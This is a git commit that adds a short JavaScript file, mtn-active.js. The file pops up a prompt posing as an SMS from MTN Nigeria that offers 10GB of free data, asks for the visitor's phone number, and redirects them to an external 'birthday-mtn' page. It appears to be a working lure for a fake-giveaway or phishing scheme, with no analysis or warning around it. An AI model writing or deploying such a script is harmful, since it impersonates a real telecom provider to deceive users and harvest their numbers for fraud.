8f83d22647a1000a2348256530c9fc3baf7f43f3
newblog13 <sweet16guyz@gmail.com>
2026-02-03 08:14:23 +0100

    Create mtn-active.js

---
+++ mtn-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your MTN Number is eligible to receive 10GB Free Data From MTN Nigeria, click OK to Enter Your MTN Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://phivez.org/birthday-mtn.html';
+}
